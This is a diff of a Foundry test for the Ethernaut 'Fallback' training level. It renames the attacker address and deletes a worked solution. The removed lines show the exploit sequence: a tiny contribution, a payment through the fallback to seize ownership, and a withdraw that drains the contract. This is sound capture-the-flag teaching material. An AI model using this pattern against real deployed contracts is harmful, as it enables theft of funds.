@@ -15,14 +15,13 @@ contract FallbackTest is Test {
 
     Ethernaut ethernaut;
 
-    /// @dev eve is the attacker
-    address eve = makeNameForAddress("eve");
+    address attacker = makeNameForAddress("attacker");
 
     function setUp() public {
         emit log_string("Setting up Fallback level...");
         ethernaut = new Ethernaut();
-        // We need to give eve some funds to attack the contract
-        vm.deal(eve, 10 wei);
+        // We need to give attacker some funds to attack the contract
+        vm.deal(attacker, 10 wei);
     }
 
     /*//////////////////////////////////////////////////////////////
@@ -37,7 +36,7 @@ contract FallbackTest is Test {
         FallbackFactory fallbackFactory = new FallbackFactory();
 
         ethernaut.registerLevel(fallbackFactory);
-        vm.startPrank(eve);
+        vm.startPrank(attacker);
 
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
         Fallback fallbackContract = Fallback(payable(levelAddress));
@@ -50,8 +49,8 @@ contract FallbackTest is Test {
             "Address of the exploit contract: ",
             address(this)
         );
-        emit log_named_address("Eve's address: ", address(eve));
-        emit log_named_uint("Balance of Eve (before): ", eve.balance);
+        emit log_named_address("Attacker's address: ", address(attacker));
+        emit log_named_uint("Balance of attacker (before): ", attacker.balance);
         emit log_named_uint(
             "Contract balance (before): ",
             address(fallbackContract).balance
@@ -64,31 +63,6 @@ contract FallbackTest is Test {
         /**
          * YOUR CODE GOES HERE
          */
-        fallbackContract.contribute.value(1 wei)();
-        emit log_named_uint(
-            "Eve's contribution: ",
-            fallbackContract.getContribution()
-        );
-
-        (bool success, ) = address(fallbackContract).call.value(1 wei)("");
-        require(success);
-
-        emit log_named_uint(
-            "Balance of the contract before withdrawal: ",
-            address(fallbackContract).balance
-        );
-
-        fallbackContract.withdraw();
-
-        emit log_named_uint(
-            "Ending balance of the contract: ",
-            address(fallbackContract).balance
-        );
-        emit log_named_address(
-            "New owner of the contract: ",
-            fallbackContract.owner()
-        );
-        emit log_named_uint("Balance of Eve (after): ", eve.balance);
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
